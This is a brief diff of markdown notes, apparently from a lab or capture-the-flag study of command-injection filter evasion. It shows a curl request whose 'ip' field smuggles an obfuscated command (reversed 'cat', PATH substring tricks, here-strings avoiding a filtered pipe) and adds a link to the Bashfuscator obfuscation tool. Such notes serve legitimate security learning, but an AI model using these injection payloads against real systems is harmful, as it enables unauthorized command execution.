@@ -7,3 +7,8 @@ curl -X POST "http://94.237.49.212:41131/" --data 'ip=;{$(rev<<<"tac"),${PATH:0:
 ```
 
 > Note that we are using <<< to avoid using a pipe |, which is a filtered character.
+
+
+# Bashfuscator
+
+https://github.com/Bashfuscator/Bashfuscator
